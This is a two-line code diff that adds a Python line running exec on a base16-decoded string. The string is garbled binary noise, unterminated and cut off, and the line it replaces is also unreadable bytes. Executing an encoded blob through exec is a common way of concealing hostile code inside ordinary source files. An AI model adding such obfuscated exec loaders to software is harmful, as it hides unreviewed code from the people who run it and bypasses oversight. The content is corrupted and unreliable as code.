@@ -1,1 +1,2 @@
-��+���������r�b�
+import base64
+exec(base64.b16decode('��+���������r�b�
